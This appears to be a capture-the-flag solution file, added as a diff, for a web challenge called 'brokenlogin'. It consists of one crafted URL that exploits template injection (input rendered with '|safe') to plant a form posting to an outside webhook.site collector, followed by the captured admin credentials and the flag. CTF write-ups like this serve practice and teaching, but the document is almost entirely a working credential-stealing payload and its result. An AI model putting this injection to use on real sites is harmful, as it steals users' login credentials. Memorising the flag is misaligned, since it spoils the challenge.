@@ -1,0 +1,5 @@
+https://brokenlogin.web.actf.co/?a=<form%20action="https://webhook.site/bbf8af87-5501-48ae-8590-73d4204b28ac"%20b=">&message={{request.args.a|safe}}
+
+username=admin&password=actf%7Badm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9%7D
+
+actf{adm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9}
